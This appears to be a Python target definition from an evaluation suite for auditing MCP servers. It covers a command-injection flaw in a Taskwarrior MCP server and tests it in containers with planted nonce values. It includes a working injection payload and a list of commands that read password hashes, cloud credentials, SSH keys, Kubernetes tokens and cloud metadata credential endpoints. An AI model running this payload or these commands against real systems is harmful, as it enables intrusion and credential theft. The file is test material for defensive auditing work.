"""CVE-2026-5833: OS command injection in mcp-server-taskwarrior (command execution).

The vulnerable handler builds a shell string and runs it through execSync (`task ${identifier}
done`), so a shell metacharacter in a tool argument executes an arbitrary command in the server's
container. The injection carries `1; <command> #`: the `#` comments out the template's trailing
` done`, so the shell runs our command, exits 0, and execSync returns its stdout (the planted
nonce) instead of throwing. The patched commit (1ee3d282) switches to execFileSync('task', [...]),
which passes each argument literally with no shell, so the same value is inert.

The server's HOME is /tmp (the unprivileged launch home), so a $HOME coordinate resolves under
/tmp. The reach is command_execution, so every kept place is read by running a command: cat for
files, id for the account, cat /proc/sys/kernel/hostname for the UTS name, curl for the internal
HTTP endpoints.
"""

import re

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-5833-taskwarrior"
PATCHED = "holdout-2026-5833-taskwarrior-patched"

# place_id -> the shell command the injection runs to surface that place's nonce. Container paths
# are the planter's resolution of the coordinates ($HOME -> /tmp, the unprivileged launch home).
PLACE_COMMANDS: dict[str, str] = {
    "process-account-identity": "id -un",
    "etc-shadow": "cat /etc/shadow",
    "container-hostname": "cat /proc/sys/kernel/hostname",
    "aws-credentials": "cat /tmp/.aws/credentials",
    "gcloud-adc": "cat /tmp/.config/gcloud/application_default_credentials.json",
    "azure-profile": "cat /tmp/.azure/azureProfile.json",
    "ssh-private-key": "cat /tmp/.ssh/id_rsa /tmp/.ssh/id_ed25519 2>/dev/null",
    "shell-history": "cat /tmp/.bash_history /tmp/.zsh_history 2>/dev/null",
    "git-credentials": "cat /tmp/.git-credentials",
    "npmrc": "cat /tmp/.npmrc",
    "gh-hosts": "cat /tmp/.config/gh/hosts.yml",
    "docker-config": "cat /tmp/.docker/config.json",
    "kube-config": "cat /tmp/.kube/config",
    "pgpass": "cat /tmp/.pgpass",
    "mysql-client-cnf": "cat /tmp/.my.cnf",
    "mongorc": "cat /tmp/.mongorc.js",
    "mysql-system-cnf": "cat /etc/mysql/my.cnf",
    "proc-environ": 'printf %s "$MCP_UPSTREAM_SECRET"',
    "run-secrets": "cat /run/secrets/db_password",
    "k8s-sa-token": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    "imds": "curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "ecs-task-credentials": "curl -s --max-time 5 http://169.254.170.2/v2/credentials/",
    "eks-pod-identity": "curl -s --max-time 5 http://169.254.170.23/v1/credentials",
    "etc-hosts": "cat /etc/hosts",
    "auth-log": "cat /var/log/auth.log /var/log/secure 2>/dev/null",
}

KEPT_PLACES: tuple[str, ...] = tuple(PLACE_COMMANDS)

AIM = re.compile(r";\s*\S")  # the payload chains a command after `;`; the benign call does not


def _payload(cmd: str) -> str:
    # `#` comments out the template's trailing ` done`, so the injected command is the last run.
    return f"1; {cmd} #"


def _make_exploit(cmd: str):
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await client.call_tool("mark_task_done", {"identifier": _payload(cmd)})

    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("add_task", {"description": "buy milk"})


TARGET = CVETarget(
    cve_id="CVE-2026-5833",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, "/tmp", has_network=False),
    builder=command_injection_env,
    exploits=tuple(_make_exploit(PLACE_COMMANDS[pid]) for pid in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: the mark_task_done tool interpolates its attacker-controlled "
        "identifier into a shell string run with execSync, so a value that chains a command "
        "(`1; <cmd> #`) executes it in the server's container."
    ),
    tools_filter=None,
)
